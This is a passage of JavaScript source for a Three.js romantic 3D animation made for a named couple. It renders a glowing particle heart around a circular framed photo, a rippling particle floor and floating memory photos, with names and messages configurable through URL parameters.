/**
 * 3D Cinematic Love Experience - Universal App Engine
 * - Couple: Đào Đức ❤️ Quỳnh Anh
 * - Embedded 3D Circular Pink Framed Photo (vip.png) as the beating core of the 3D Heart
 * - 3D Volumetric Sculpted Heart: Dense outer shell & mid-body wrapping around the photo
 * - Holographic Space Carpet (Tấm Thảm Không Gian) beneath the heart with undulating wave grid
 * - Pure Heart Explosion on tap / click
 * - 22 Memory Photos (1.png - 22.png) floating gently from bottom to top (5-7 active, ~5% size)
 */
(function() {
    'use strict';

    // =========================================================================
    // 1. CONFIGURATION & URL PARSER
    // =========================================================================
    const DEFAULT_LOVE_CONFIG = {
        person1: "Đào Đức",
        person2: "Quỳnh Anh",
        date: "",
        mainMessage: "Đào Đức ❤️ Quỳnh Anh",
        messages: [
            "Đào Đức ❤️ Quỳnh Anh",
            "Đào Đức",
            "Quỳnh Anh",
            "I LOVE YOU",
            "Forever",
            "Love You",
            "Together",
            "Our Love",
            "Forever & Always",
            "My Only One",
            "Yêu Em Mãi Mãi",
            "Bên Nhau Trọn Đời",
            "❤️"
        ],
        mainHeartColor: "#ff003c",
        goldHeartColor: "#ffd76a",
        textColor: "#ff4d91",
        textGlowColor: "#ff0055",
        backgroundColor: "#050003",
        musicUrl: "assets/music.mp3"
    };

    function decodeConfigFromUrl(encodedStr) {
        if (!encodedStr) return null;
        try {
            const binaryStr = atob(decodeURIComponent(encodedStr));
            const bytes = new Uint8Array(binaryStr.length);
            for (let i = 0; i < binaryStr.length; i++) {
                bytes[i] = binaryStr.charCodeAt(i);
            }
            const jsonStr = new TextDecoder().decode(bytes);
            return JSON.parse(jsonStr);
        } catch (e) {
            console.error("Failed to decode config:", e);
            return null;
        }
    }

    function getActiveLoveConfig() {
        const urlParams = new URLSearchParams(window.location.search);
        const encodedData = urlParams.get('d') || urlParams.get('data');
        let customConfig = {};

        if (encodedData) {
            const decoded = decodeConfigFromUrl(encodedData);
            if (decoded) customConfig = decoded;
        } else {
            const p1 = urlParams.get('p1');
            const p2 = urlParams.get('p2');
            const msg = urlParams.get('msg');
            const music = urlParams.get('music');

            if (p1) customConfig.person1 = p1;
            if (p2) customConfig.person2 = p2;
            if (msg) customConfig.mainMessage = msg;
            if (music) customConfig.musicUrl = music;
        }

        const merged = Object.assign({}, DEFAULT_LOVE_CONFIG, customConfig);
        if (customConfig.messages && Array.isArray(customConfig.messages) && customConfig.messages.length > 0) {
            merged.messages = customConfig.messages;
        } else {
            const dynamicList = [
                merged.mainMessage || `${merged.person1} ❤️ ${merged.person2}`,
                `${merged.person1} ❤️ ${merged.person2}`,
                merged.person1,
                merged.person2,
                "I LOVE YOU",
                "Forever & Always",
                "Together",
                "Our Love",
                "My World",
                "Yêu Em Mãi Mãi",
                "Bên Nhau Trọn Đời",
                "❤️"
            ].filter(Boolean);
            merged.messages = Array.from(new Set(dynamicList));
        }
        return merged;
    }

    // =========================================================================
    // 2. DEVICE & PERFORMANCE TUNER
    // =========================================================================
    const isMobile = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || (window.innerWidth <= 768);

    function getPerformanceConfig() {
        const mobile = isMobile();
        return {
            isMobile: mobile,
            pixelRatio: Math.min(window.devicePixelRatio || 1, 2.5),
            heartParticles: mobile ? 130000 : 150000,
            groundGridX: mobile ? 70 : 85,
            groundGridZ: mobile ? 70 : 85,
            sparkleCount: mobile ? 280 : 350,
            floatingHeartCount: mobile ? 35 : 45,
            floatingTextCount: mobile ? 14 : 18,
            bloomStrength: 0.95,
            bloomRadius: 0.48,
            bloomThreshold: 0.38
        };
    }

    // =========================================================================
    // 3. MATH & RANDOM HELPERS
    // =========================================================================
    const randomRange = (min, max) => Math.random() * (max - min) + min;
    const randomChoice = (arr) => arr[Math.floor(Math.random() * arr.length)];
    const lerp = (start, end, amt) => (1 - amt) * start + amt * end;
    
    function randomGaussian(mean = 0, stdev = 1) {
        let u = 1 - Math.random();
        let v = Math.random();
        let z = Math.sqrt(-2.0 * Math.log(u)) * Math.cos(2.0 * Math.PI * v);
        return z * stdev + mean;
    }

    // =========================================================================
    // 4. PROCEDURAL TEXTURES & CIRCULAR PINK PHOTO
    // =========================================================================
    const textureCache = new Map();

    function createHeartTexture(size = 128, color = '#ffffff') {
        const key = `heart_${size}_${color}`;
        if (textureCache.has(key)) return textureCache.get(key);

        const canvas = document.createElement('canvas');
        canvas.width = size;
        canvas.height = size;
        const ctx = canvas.getContext('2d');

        const center = size / 2;
        const s = size * 0.44;

        const glowGrad = ctx.createRadialGradient(center, center, s * 0.1, center, center, size * 0.48);
        glowGrad.addColorStop(0, 'rgba(255, 255, 255, 1.0)');
        glowGrad.addColorStop(0.35, 'rgba(255, 120, 160, 0.7)');
        glowGrad.addColorStop(0.75, 'rgba(255, 30, 80, 0.2)');
        glowGrad.addColorStop(1, 'rgba(255, 0, 80, 0)');

        ctx.fillStyle = glowGrad;
        ctx.beginPath();
        ctx.arc(center, center, size * 0.48, 0, Math.PI * 2);
        ctx.fill();

        ctx.save();
        ctx.translate(center, center + s * 0.08);
        ctx.beginPath();
        ctx.moveTo(0, s * 0.35);
        ctx.bezierCurveTo(-s * 0.6, -s * 0.3, -s * 0.7, s * 0.1, 0, s * 0.75);
        ctx.bezierCurveTo(s * 0.7, s * 0.1, s * 0.6, -s * 0.3, 0, s * 0.35);
        ctx.closePath();

        ctx.fillStyle = color;
        ctx.shadowColor = 'rgba(255, 255, 255, 0.9)';
        ctx.shadowBlur = size * 0.08;
        ctx.fill();
        ctx.restore();

        const texture = new THREE.CanvasTexture(canvas);
        texture.generateMipmaps = true;
        texture.minFilter = THREE.LinearMipmapLinearFilter;
        texture.magFilter = THREE.LinearFilter;
        textureCache.set(key, texture);
        return texture;
    }

    function createGlowDiscTexture(size = 64) {
        const key = `glow_disc_${size}`;
        if (textureCache.has(key)) return textureCache.get(key);

        const canvas = document.createElement('canvas');
        canvas.width = size;
        canvas.height = size;
        const ctx = canvas.getContext('2d');

        const center = size / 2;
        const radius = size / 2;

        const grad = ctx.createRadialGradient(center, center, 0, center, center, radius);
        grad.addColorStop(0, 'rgba(255, 255, 255, 1.0)');
        grad.addColorStop(0.25, 'rgba(255, 200, 220, 0.85)');
        grad.addColorStop(0.6, 'rgba(255, 50, 100, 0.25)');
        grad.addColorStop(1, 'rgba(255, 0, 50, 0)');

        ctx.fillStyle = grad;
        ctx.beginPath();
        ctx.arc(center, center, radius, 0, Math.PI * 2);
        ctx.fill();

        const texture = new THREE.CanvasTexture(canvas);
        textureCache.set(key, texture);
        return texture;
    }

    function createSparkleTexture(size = 128) {
        const key = `sparkle_${size}`;
        if (textureCache.has(key)) return textureCache.get(key);

        const canvas = document.createElement('canvas');
        canvas.width = size;
        canvas.height = size;
        const ctx = canvas.getContext('2d');
        const center = size / 2;

        const grad = ctx.createRadialGradient(center, center, 0, center, center, size * 0.4);
        grad.addColorStop(0, 'rgba(255, 255, 255, 1.0)');
        grad.addColorStop(0.4, 'rgba(255, 220, 240, 0.6)');
        grad.addColorStop(1, 'rgba(255, 100, 150, 0)');
        ctx.fillStyle = grad;
        ctx.beginPath();
        ctx.arc(center, center, size * 0.4, 0, Math.PI * 2);
        ctx.fill();

        ctx.fillStyle = 'rgba(255, 255, 255, 0.95)';
        ctx.beginPath();
        ctx.ellipse(center, center, size * 0.46, size * 0.05, 0, 0, Math.PI * 2);
        ctx.fill();

        ctx.beginPath();
        ctx.ellipse(center, center, size * 0.05, size * 0.46, 0, 0, Math.PI * 2);
        ctx.fill();

        const texture = new THREE.CanvasTexture(canvas);
        textureCache.set(key, texture);
        return texture;
    }

    function createNeonTextTexture(text, options = {}) {
        const fontSize = options.fontSize || 54;
        const color = options.color || '#ff4d91';
        const glowColor = options.glowColor || '#ff0055';
        const fontFamily = options.fontFamily || "'Be Vietnam Pro', 'Montserrat', 'Outfit', sans-serif";
        const fontWeight = options.fontWeight || '700';

        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');

        const fontStr = `${fontWeight} ${fontSize}px ${fontFamily}`;
        ctx.font = fontStr;

        const metrics = ctx.measureText(text);
        const textWidth = Math.ceil(metrics.width);
        const textHeight = Math.ceil(fontSize * 1.6);
        const padding = Math.ceil(fontSize * 0.9);

        canvas.width = textWidth + padding * 2;
        canvas.height = textHeight + padding * 2;

        ctx.font = fontStr;
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';

        const cx = canvas.width / 2;
        const cy = canvas.height / 2;

        // 1. Neon ambient outer glow
        ctx.shadowColor = glowColor;
        ctx.shadowBlur = fontSize * 0.6;
        ctx.fillStyle = color;
        ctx.fillText(text, cx, cy);

        // 2. Crisp inner text
        ctx.shadowBlur = fontSize * 0.15;
        ctx.fillStyle = '#ffffff';
        ctx.fillText(text, cx, cy);

        const texture = new THREE.CanvasTexture(canvas);
        texture.generateMipmaps = true;
        texture.minFilter = THREE.LinearMipmapLinearFilter;
        texture.magFilter = THREE.LinearFilter;
        texture.needsUpdate = true;

        return {
            texture,
            aspectRatio: canvas.width / canvas.height,
            width: canvas.width,
            height: canvas.height
        };
    }

    // Load and build clean circular photo with glowing pink border (Khung tròn màu hồng)
    function createCircularPinkPhotoTexture(onReady) {
        const img = new Image();

        const renderCanvas = (image) => {
            const size = 512;
            const canvas = document.createElement('canvas');
            canvas.width = size;
            canvas.height = size;
            const ctx = canvas.getContext('2d');
            const cx = size / 2;
            const cy = size / 2;
            const radius = size * 0.44;

            // 1. Circular Masked Photo
            ctx.save();
            ctx.beginPath();
            ctx.arc(cx, cy, radius, 0, Math.PI * 2);
            ctx.clip();

            const minDim = Math.min(image.width, image.height);
            const sx = (image.width - minDim) / 2;
            const sy = (image.height - minDim) / 2;
            ctx.drawImage(image, sx, sy, minDim, minDim, cx - radius, cy - radius, radius * 2, radius * 2);
            ctx.restore();

            // 2. Pure Glowing Pink Circular Border (Khung tròn màu hồng tỏa sáng)
            ctx.save();
            ctx.shadowColor = '#ff0055';
            ctx.shadowBlur = 24;
            ctx.lineWidth = 14;
            ctx.strokeStyle = '#ff2a6d';
            ctx.beginPath();
            ctx.arc(cx, cy, radius, 0, Math.PI * 2);
            ctx.stroke();

            // Inner soft white-pink highlight
            ctx.shadowColor = '#ffffff';
            ctx.shadowBlur = 8;
            ctx.lineWidth = 4;
            ctx.strokeStyle = '#ffe4ee';
            ctx.beginPath();
            ctx.arc(cx, cy, radius - 3, 0, Math.PI * 2);
            ctx.stroke();
            ctx.restore();

            const tex = new THREE.CanvasTexture(canvas);
            tex.generateMipmaps = true;
            tex.minFilter = THREE.LinearMipmapLinearFilter;
            tex.magFilter = THREE.LinearFilter;
            tex.needsUpdate = true;
            onReady(tex);
        };

        img.onload = () => renderCanvas(img);
        img.onerror = () => {
            if (!img.src.includes('img/vip.png')) {
                img.src = 'img/vip.png';
            } else if (!img.src.includes('assets/vip.png')) {
                img.src = 'assets/vip.png';
            }
        };
        img.src = 'vip.png';
    }

    // =========================================================================
    // 5. 3D OBJECTS
    // =========================================================================

    // --- ParticleHeart: Volumetric 3D Sculpted Heart with Embedded Circular Pink Photo ---
    class ParticleHeart {
        constructor(scene) {
            this.scene = scene;
            const perf = getPerformanceConfig();
            this.particleCount = perf.heartParticles;

            this.group = new THREE.Group();
            this.scene.add(this.group);

            this.group.rotation.x = 0.12;
            this.photoBaseScale = 0.0;
            this.photoTargetScale = 2.45;

            this.initGeometry();
            this.initMaterial();
            this.initPoints();
            this.initEmbeddedPhoto();
            this.updateScale();
        }

        updateScale() {
            const aspect = window.innerWidth / window.innerHeight;
            if (aspect < 1.0) {
                // Mobile screen: perfectly scale heart so left/right/top/bottom fit with luxurious margins
                const mobileScale = Math.min(0.78, Math.max(0.62, aspect * 1.45));
                this.group.scale.setScalar(mobileScale);
            } else {
                this.group.scale.setScalar(1.0);
            }
        }

        initGeometry() {
            this.geometry = new THREE.BufferGeometry();
            const positions = new Float32Array(this.particleCount * 3);
            const startPositions = new Float32Array(this.particleCount * 3);
            const targetPositions = new Float32Array(this.particleCount * 3);
            const goldColors = new Float32Array(this.particleCount * 3);
            const redColors = new Float32Array(this.particleCount * 3);
            const sizes = new Float32Array(this.particleCount);
            const phases = new Float32Array(this.particleCount);
            const sparkleSpeeds = new Float32Array(this.particleCount);
            const isShellArr = new Float32Array(this.particleCount);

            const goldPalette = [
                new THREE.Color('#FFD76A'),
                new THREE.Color('#FFC837'),
                new THREE.Color('#FFE58F'),
                new THREE.Color('#FFF1B0'),
                new THREE.Color('#E6A817')
            ];

            const redPalette = [
                new THREE.Color('#ff0033'),
                new THREE.Color('#e60029'),
                new THREE.Color('#cc0026'),
                new THREE.Color('#ff0044'),
                new THREE.Color('#d40030'),
                new THREE.Color('#b80024')
            ];

            // 3D Solid Heart Manifold with 100% Uniform Spatial Density (Không bị tụ hạt/đậm nét ở giữa)
            function inside3DHeart(x, y, z) {
                const a = x * x + y * y + 2.2 * z * z - 1.0;
                return (a * a * a - x * x * y * y * y - 0.12 * z * z * y * y * y) <= 0;
            }

            const scaleX = 3.50;
            const scaleY = 2.95; // Cao hơn 1 tí chuẩn đẹp
            const scaleZ = 3.25;

            let sampled = 0;
            while (sampled < this.particleCount) {
                const x = (Math.random() * 2.6 - 1.3);
                const y = (Math.random() * 2.6 - 1.3);
                const z = (Math.random() * 1.8 - 0.9);

                if (!inside3DHeart(x, y, z)) continue;

                const i3 = sampled * 3;

                targetPositions[i3] = x * scaleX;
                targetPositions[i3 + 1] = y * scaleY + 0.35;
                targetPositions[i3 + 2] = z * scaleZ;

                // Water Surge from Bottom Pool (Dưới đáy màn hình dâng trào như nước)
                const poolAngle = Math.random() * Math.PI * 2;
                const poolRadius = 1.0 + Math.sqrt(Math.random()) * 12.0;
                const poolHeight = -18.0 - Math.random() * 8.0;

                startPositions[i3] = Math.cos(poolAngle) * poolRadius;
                startPositions[i3 + 1] = poolHeight;
                startPositions[i3 + 2] = Math.sin(poolAngle) * poolRadius;

                positions[i3] = startPositions[i3];
                positions[i3 + 1] = startPositions[i3 + 1];
                positions[i3 + 2] = startPositions[i3 + 2];

                const goldCol = goldPalette[Math.floor(Math.random() * goldPalette.length)];
                goldColors[i3] = goldCol.r;
                goldColors[i3 + 1] = goldCol.g;
                goldColors[i3 + 2] = goldCol.b;

                const redCol = redPalette[Math.floor(Math.random() * redPalette.length)];
                redColors[i3] = redCol.r;
                redColors[i3 + 1] = redCol.g;
                redColors[i3 + 2] = redCol.b;

                // Enhanced micro stardust particle size (to và đậm nét hơn)
                sizes[sampled] = 2.85 * (0.9 + Math.random() * 0.35);
                phases[sampled] = Math.random();
                sparkleSpeeds[sampled] = 1.2 + Math.random() * 2.5;

                sampled++;
            }

            this.geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
            this.geometry.setAttribute('aStartPos', new THREE.BufferAttribute(startPositions, 3));
            this.geometry.setAttribute('aTargetPos', new THREE.BufferAttribute(targetPositions, 3));
            this.geometry.setAttribute('aGoldColor', new THREE.BufferAttribute(goldColors, 3));
            this.geometry.setAttribute('aRedColor', new THREE.BufferAttribute(redColors, 3));
            this.geometry.setAttribute('aSize', new THREE.BufferAttribute(sizes, 1));
            this.geometry.setAttribute('aPhase', new THREE.BufferAttribute(phases, 1));
            this.geometry.setAttribute('aSparkleSpeed', new THREE.BufferAttribute(sparkleSpeeds, 1));
        }

        initMaterial() {
            const discTexture = createGlowDiscTexture(64);

            this.uniforms = {
                uTime: { value: 0 },
                uConvergence: { value: 0.0 },
                uColorMode: { value: 0.0 },
                uTexture: { value: discTexture },
                uHeartScale: { value: 1.0 },
                uPulse: { value: 0.0 },
                uGlobalAlpha: { value: 0.0 },
                uExplode: { value: 0.0 }
            };

            const vertexShader = `
                attribute vec3 aStartPos;
                attribute vec3 aTargetPos;
                attribute vec3 aGoldColor;
                attribute vec3 aRedColor;
                attribute float aSize;
                attribute float aPhase;
                attribute float aSparkleSpeed;

                uniform float uTime;
                uniform float uConvergence;
                uniform float uColorMode;
                uniform float uHeartScale;
                uniform float uPulse;
                uniform float uGlobalAlpha;
                uniform float uExplode;

                varying vec3 vColor;
                varying float vAlpha;

                void main() {
                    float t = clamp(uConvergence, 0.0, 1.0);
                    vec3 mixedPos;

                    // Centroid point where firework clusters together tightly (chụm lại 1 nhúm sáng)
                    vec3 clusterCore = vec3(0.0, 0.4, 0.0) + (aTargetPos - vec3(0.0, 0.4, 0.0)) * 0.035;

                    if (t < 0.35) {
                        // 1. Phóng từ dưới đáy lên & chụm lại 1 nhúm pháo hoa rực rỡ ở tâm
                        float p1 = t / 0.35;
                        float ease1 = p1 * p1; // Gia tốc phóng lên
                        mixedPos = mix(aStartPos, clusterCore, ease1);
                        // Vệt tia lửa xoáy uốn lượn khi bay lên
                        mixedPos.x += sin(uTime * 4.0 + aPhase * 6.28) * (1.0 - ease1) * 0.35;
                        mixedPos.z += cos(uTime * 4.0 + aPhase * 6.28) * (1.0 - ease1) * 0.35;
                    } else if (t < 0.85) {
                        // 2. Phình to bùng nổ bung ra thành Trái Tim Vàng rực rỡ
                        float p2 = (t - 0.35) / 0.50;
                        float c1 = 1.65;
                        float c3 = c1 + 1.0;
                        float ease2 = 1.0 + c3 * pow(p2 - 1.0, 3.0) + c1 * pow(p2 - 1.0, 2.0);
                        mixedPos = mix(clusterCore, aTargetPos, ease2);
                    } else {
                        // 3. Trái Tim Vàng hoàn chỉnh, phát sáng và thở êm ái
                        mixedPos = aTargetPos;
                    }

                    // Floating organic idle breathing when formed
                    if (t > 0.85) {
                        float osc = (t - 0.85) / 0.15;
                        float smallAmount = 0.035 * osc;
                        mixedPos.x += sin(uTime * 2.0 + aPhase * 6.28) * smallAmount;
                        mixedPos.y += cos(uTime * 1.8 + aPhase * 7.54) * smallAmount;
                        mixedPos.z += sin(uTime * 2.5 + aPhase * 5.02) * (smallAmount * 1.2);
                    }

                    // 4. Lóe sáng & Bung tia pháo hoa khi chuyển sang Trái Tim Đỏ (Firework Supernova Burst)
                    if (uExplode > 0.001) {
                        vec3 burstDir = normalize(mixedPos - vec3(0.0, 0.4, 0.0));
                        mixedPos += burstDir * (uExplode * (1.8 + aPhase * 1.6));
                    }

                    vec3 finalPos = mixedPos * (uHeartScale + uPulse * 0.22);
                    vec4 mvPosition = modelViewMatrix * vec4(finalPos, 1.0);
                    gl_Position = projectionMatrix * mvPosition;

                    float sparkle = 0.5 + 0.5 * sin(uTime * aSparkleSpeed + aPhase * 6.28);
                    float sizeSparkle = mix(0.88, 1.22, sparkle);

                    // Khi chụm lại 1 nhúm hoặc khi nổ lóe sáng, hạt to và rực rỡ hơn
                    float burstSize = 1.0 + uExplode * 1.4 + (t < 0.35 ? (1.0 - t/0.35) * 0.45 : 0.0);
                    gl_PointSize = (aSize * sizeSparkle * burstSize) * (7.6 / -mvPosition.z);

                    vec3 baseCol = mix(aGoldColor, aRedColor, uColorMode);
                    // Lóe sáng chói lòa như pháo hoa trước khi sang đỏ
                    vec3 flashLight = vec3(uExplode * 0.85);
                    vColor = baseCol + vec3(sparkle * 0.04) + flashLight;
                    vAlpha = uGlobalAlpha * mix(0.95, 1.0, sparkle);
                }
            `;

            const fragmentShader = `
                uniform sampler2D uTexture;
                varying vec3 vColor;
                varying float vAlpha;

                void main() {
                    vec4 texColor = texture2D(uTexture, gl_PointCoord);
                    if (texColor.a < 0.05) discard;
                    float alpha = pow(texColor.a, 0.55) * vAlpha;
                    gl_FragColor = vec4(vColor * 1.28, alpha);
                }
            `;

            this.material = new THREE.ShaderMaterial({
                uniforms: this.uniforms,
                vertexShader,
                fragmentShader,
                transparent: true,
                depthWrite: false,
                blending: THREE.AdditiveBlending
            });
        }

        initPoints() {
            this.points = new THREE.Points(this.geometry, this.material);
            this.group.add(this.points);
        }

        // Embedded as a physical part of the 3D Heart group
        initEmbeddedPhoto() {
            this.photoMaterial = new THREE.MeshBasicMaterial({
                transparent: true,
                opacity: 0,
                side: THREE.DoubleSide,
                depthWrite: false
            });

            this.photoMesh = new THREE.Mesh(new THREE.PlaneGeometry(1.0, 1.0), this.photoMaterial);
            this.photoMesh.position.set(0, 0.42, 0.02);
            this.photoMesh.scale.set(0.001, 0.001, 1.0);
            this.group.add(this.photoMesh);

            createCircularPinkPhotoTexture((tex) => {
                this.photoMaterial.map = tex;
                this.photoMaterial.needsUpdate = true;
            });
        }

        update(time) {
            this.uniforms.uTime.value = time;
            let pulseVal = 0;
            if (this.uniforms.uColorMode.value > 0.5) {
                const period = 1.05;
                const t = (time % period) / period;
                const b1 = Math.exp(-Math.pow((t - 0.16) / 0.06, 2)) * 0.18; // Lub: strong primary pulse
                const b2 = Math.exp(-Math.pow((t - 0.36) / 0.06, 2)) * 0.11; // Dub: secondary pulse
                const b3 = Math.max(0, Math.sin(t * Math.PI)) * 0.02;        // Diastole relaxation
                pulseVal = b1 + b2 + b3;
                this.uniforms.uPulse.value = pulseVal;
            }

            this.group.rotation.y = Math.sin(time * 0.35) * 0.32;
            this.group.rotation.x = 0.12 + Math.cos(time * 0.25) * 0.08;
        }

        revealPhoto(duration = 1.6) {
            const gsap = window.gsap;
            if (gsap) {
                gsap.to(this, {
                    photoBaseScale: this.photoTargetScale,
                    duration: duration,
                    ease: "back.out(1.5)"
                });
            } else {
                this.photoBaseScale = this.photoTargetScale;
            }
        }

        setConvergence(val) { this.uniforms.uConvergence.value = val; }
        setColorMode(val) { this.uniforms.uColorMode.value = val; }
        setAlpha(val) { this.uniforms.uGlobalAlpha.value = val; }
    }

    // --- ParticleGround: Holographic Space Carpet (Tấm Thảm Không Gian) ---
    class ParticleGround {
        constructor(scene) {
            this.scene = scene;
            const perf = getPerformanceConfig();
            this.gridX = perf.groundGridX;
            this.gridZ = perf.groundGridZ;
            this.count = this.gridX * this.gridZ;

            this.initGeometry();
            this.initMaterial();
            this.initPoints();
        }

        initGeometry() {
            this.geometry = new THREE.BufferGeometry();
            const positions = new Float32Array(this.count * 3);
            const gridCoords = new Float32Array(this.count * 2);
            const goldColors = new Float32Array(this.count * 3);
            const redColors = new Float32Array(this.count * 3);
            const sizes = new Float32Array(this.count);

            const goldPalette = [
                new THREE.Color('#ffd76a'),
                new THREE.Color('#ffc837'),
                new THREE.Color('#ffe58f'),
                new THREE.Color('#fff1b0'),
                new THREE.Color('#ffffff')
            ];

            const redPalette = [
                new THREE.Color('#ff003c'),
                new THREE.Color('#ff1744'),
                new THREE.Color('#ff2a6d'),
                new THREE.Color('#ff0055'),
                new THREE.Color('#ff4d91')
            ];

            const carpetWidth = 38.0;
            const carpetDepth = 38.0;
            const groundY = -3.65;

            let idx = 0;
            for (let ix = 0; ix < this.gridX; ix++) {
                for (let iz = 0; iz < this.gridZ; iz++) {
                    const i3 = idx * 3;
                    const i2 = idx * 2;

                    const u = (ix / (this.gridX - 1)) * 2 - 1;
                    const v = (iz / (this.gridZ - 1)) * 2 - 1;

                    const x = u * (carpetWidth / 2);
                    const z = v * (carpetDepth / 2);
                    const y = groundY;

                    positions[i3] = x;
                    positions[i3 + 1] = y;
                    positions[i3 + 2] = z;

                    gridCoords[i2] = u;
                    gridCoords[i2 + 1] = v;

                    const centerDist = Math.sqrt(u * u + v * v);
                    const isCenterSpark = centerDist < 0.45 && Math.random() < 0.28;
                    const gCol = isCenterSpark
                        ? new THREE.Color('#ffffff')
                        : goldPalette[Math.floor(Math.random() * goldPalette.length)];
                    const rCol = isCenterSpark
                        ? new THREE.Color('#ffffff')
                        : redPalette[Math.floor(Math.random() * redPalette.length)];

                    goldColors[i3] = gCol.r;
                    goldColors[i3 + 1] = gCol.g;
                    goldColors[i3 + 2] = gCol.b;

                    redColors[i3] = rCol.r;
                    redColors[i3 + 1] = rCol.g;
                    redColors[i3 + 2] = rCol.b;

                    const isGridLine = (ix % 4 === 0) || (iz % 4 === 0);
                    sizes[idx] = (isGridLine ? 7.5 : 5.0) * (0.85 + Math.random() * 0.35);

                    idx++;
                }
            }

            this.geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
            this.geometry.setAttribute('aGridCoord', new THREE.BufferAttribute(gridCoords, 2));
            this.geometry.setAttribute('aGoldColor', new THREE.BufferAttribute(goldColors, 3));
            this.geometry.setAttribute('aRedColor', new THREE.BufferAttribute(redColors, 3));
            this.geometry.setAttribute('aSize', new THREE.BufferAttribute(sizes, 1));
        }

        initMaterial() {
            const glowTexture = createGlowDiscTexture(64);
            this.uniforms = {
                uTime: { value: 0 },
                uTexture: { value: glowTexture },
                uAlpha: { value: 0.0 },
                uColorMode: { value: 0.0 }
            };

            const vertexShader = `
                attribute vec2 aGridCoord;
                attribute vec3 aGoldColor;
                attribute vec3 aRedColor;
                attribute float aSize;

                uniform float uTime;
                uniform float uAlpha;
                uniform float uColorMode;

                varying vec3 vColor;
                varying float vAlpha;

                void main() {
                    vec3 pos = position;

                    float dist = length(aGridCoord);
                    float wave = sin(dist * 7.0 - uTime * 1.8) * 0.35 + sin(pos.x * 0.2 + uTime * 0.8) * 0.16;
                    pos.y += wave;

                    vec4 mvPosition = modelViewMatrix * vec4(pos, 1.0);
                    gl_Position = projectionMatrix * mvPosition;

                    float edgeFade = smoothstep(1.2, 0.2, dist);
                    float rippleGlow = 0.5 + 0.5 * sin(dist * 7.0 - uTime * 1.8);
                    gl_PointSize = (aSize * (1.0 + rippleGlow * 0.45)) * (14.5 / -mvPosition.z);

                    vec3 baseCol = mix(aGoldColor, aRedColor, uColorMode);
                    vColor = baseCol + vec3(rippleGlow * 0.28);
                    vAlpha = uAlpha * edgeFade * (0.75 + 0.35 * rippleGlow);
                }
            `;

            const fragmentShader = `
                uniform sampler2D uTexture;
                varying vec3 vColor;
                varying float vAlpha;

                void main() {
                    vec4 texColor = texture2D(uTexture, gl_PointCoord);
                    if (texColor.a < 0.05) discard;
                    float alpha = pow(texColor.a, 0.65) * vAlpha;
                    gl_FragColor = vec4(vColor * 1.25, alpha);
                }
            `;

            this.material = new THREE.ShaderMaterial({
                uniforms: this.uniforms,
                vertexShader,
                fragmentShader,
                transparent: true,
                depthWrite: false,
                blending: THREE.AdditiveBlending
            });
        }

        initPoints() {
            this.points = new THREE.Points(this.geometry, this.material);
            this.scene.add(this.points);
        }

        update(time, delta) {
            this.uniforms.uTime.value = time;
        }

        setAlpha(val) {
            this.uniforms.uAlpha.value = val;
        }

        setColorMode(val) {
            this.uniforms.uColorMode.value = val;
        }
    }

    // =========================================================================
    // FLOATING MEMORY PHOTOS CONTROLLER (1.png - 22.png)
    // Mobile: Natural organic spread (9 active)
    // Desktop: Perfectly balanced winged distribution (14 active, 7 left & 7 right)
    // =========================================================================
    class FloatingPhotosManager {
        constructor() {
            this.container = document.getElementById('floating-photos-container');
            this.items = [];
            this.totalImagePool = 22;
            this.activePhotosCount = isMobile() ? 9 : 14;
            this.globalAlpha = 0;
            this.initPhotos();
        }

        getDesktopX(index, total) {
            const w = window.innerWidth;
            const isLeft = (index % 2 === 0);
            const sideCount = Math.floor(total / 2);
            const laneIndex = Math.floor(index / 2);
            const norm = (laneIndex + 0.5) / Math.max(sideCount, 1);

            if (isLeft) {
                // Cánh Trái: Trải đều từ 3% đến 34% chiều rộng
                const startX = w * 0.03;
                const endX = w * 0.34;
                return startX + norm * (endX - startX) + randomRange(-18, 18);
            } else {
                // Cánh Phải: Trải đều từ 66% đến 97% chiều rộng
                const startX = w * 0.66;
                const endX = w * 0.97;
                return startX + norm * (endX - startX) + randomRange(-18, 18);
            }
        }

        initPhotos() {
            if (!this.container) return;

            const w = window.innerWidth;
            const h = window.innerHeight;
            const mobile = isMobile();

            for (let i = 0; i < this.activePhotosCount; i++) {
                const card = document.createElement('div');
                card.className = 'floating-photo-card';

                const photoIndex = (i % this.totalImagePool) + 1;
                const img = document.createElement('img');
                img.src = `img/${photoIndex}.png`;
                img.alt = `Memory ${photoIndex}`;
                img.onerror = () => {
                    img.src = `img/${photoIndex}.jpg`;
                };

                const badge = document.createElement('div');
                badge.className = 'photo-badge';
                badge.textContent = ['💖', '✨', '🌸', '💕', '💫', '🌹'][i % 6];

                card.appendChild(img);
                card.appendChild(badge);
                this.container.appendChild(card);

                // Phân bổ tọa độ ban đầu
                let initX, initY;
                if (mobile) {
                    // Mobile: Giữ nguyên cách rải ngẫu nhiên tự nhiên
                    initX = Math.random() * (w - 70);
                    initY = Math.random() * (h + 150) - 50;
                } else {
                    // Desktop: Rải đều theo từng tầng và 2 bên cánh để không bị lệch
                    initX = this.getDesktopX(i, this.activePhotosCount);
                    const stepY = (h * 1.35) / this.activePhotosCount;
                    initY = (i * stepY) - 60 + randomRange(-20, 20);
                }

                const item = {
                    index: i,
                    el: card,
                    imgEl: img,
                    x: initX,
                    y: initY,
                    speedY: mobile ? randomRange(0.55, 1.1) : randomRange(0.65, 0.95),
                    swaySpeed: randomRange(0.015, 0.028),
                    swayAmp: mobile ? randomRange(0.6, 1.2) : randomRange(0.8, 1.4),
                    swayAngle: (i / this.activePhotosCount) * Math.PI * 2,
                    angle: randomRange(-10, 10),
                    rotSpeed: randomRange(-0.06, 0.06),
                    scale: mobile ? randomRange(0.9, 1.05) : randomRange(0.95, 1.08)
                };

                this.items.push(item);
            }
        }

        update() {
            const w = window.innerWidth;
            const h = window.innerHeight;
            const mobile = isMobile();

            for (let i = 0; i < this.items.length; i++) {
                const item = this.items[i];

                item.y -= item.speedY;
                item.swayAngle += item.swaySpeed;
                item.x += Math.sin(item.swayAngle) * item.swayAmp;
                item.angle += item.rotSpeed;

                if (item.y < -90) {
                    item.y = h + randomRange(25, 75);

                    if (mobile) {
                        item.x = Math.random() * (w - 70);
                    } else {
                        // Desktop: Rải đều theo vị trí cột chuẩn xác
                        item.x = this.getDesktopX(item.index, this.activePhotosCount);
                    }

